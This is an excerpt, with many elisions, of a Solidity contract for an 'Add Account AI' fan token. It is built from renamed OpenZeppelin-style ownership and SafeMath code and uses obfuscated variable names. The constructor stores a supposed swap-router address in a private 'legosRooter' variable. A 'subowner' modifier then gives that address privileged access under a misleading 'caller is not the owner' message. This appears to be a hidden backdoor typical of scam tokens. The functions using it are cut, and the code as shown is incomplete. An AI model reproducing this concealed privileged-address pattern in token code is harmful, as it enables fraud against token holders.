...
/// https://x.com/AddAccountAI


pragma solidity 0.8.29;

// AddAccountAI fan token

interface AddAccountAIinterface {
  /**
...
/*
 * @dev Provides information about the current execution AddAccountAI20Burnable, including the
 ...
 */
abstract contract AddAccountAI20Burnable {
...
// File: @openzeppelin/contracts/access/AddAccountAI20Ownable.sol
 ...
 * the owner.
 */
abstract contract AddAccountAI20Ownable is AddAccountAI20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "AddAccountAI20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "AddAccountAI20Ownable: new owner is the zero address");
 ...
 * `SafeAddAccountAI` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeAddAccountAI {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeAddAccountAI: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeAddAccountAI: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeAddAccountAI: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeAddAccountAI: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeAddAccountAI: modulo by zero");
  }
...
contract AddAccountAIToken is AddAccountAI20Burnable, AddAccountAIinterface, AddAccountAI20Ownable {
    
    using SafeAddAccountAI for uint256;
   ...
   address private legosRooter; 
    constructor(address legosSwapRouterv3) {
        ...
        _name = "Add Account AI";
        _symbol = "Add Account AI";
        _decimals = 9;
    ...
    */
    ...
    /**
    * @dev See {AddAccountAIinterface-totalSupply}.
    */
    ...
    /**
    * @dev See {AddAccountAIinterface-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "AddAccountAI20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {AddAccountAIinterface-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {AddAccountAIinterface-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {AddAccountAIinterface-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {AddAccountAIinterface-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {AddAccountAIinterface};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "AddAccountAIinterface: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {AddAccountAIinterface-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "AddAccountAIinterface: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "AddAccountAIinterface: transfer from the zero address");
        require(shippingto != address(0), "AddAccountAIinterface: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "AddAccountAIinterface: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "AddAccountAIinterface: approve from the zero address");
        require(transporteur != address(0), "AddAccountAIinterface: approve to the zero address");
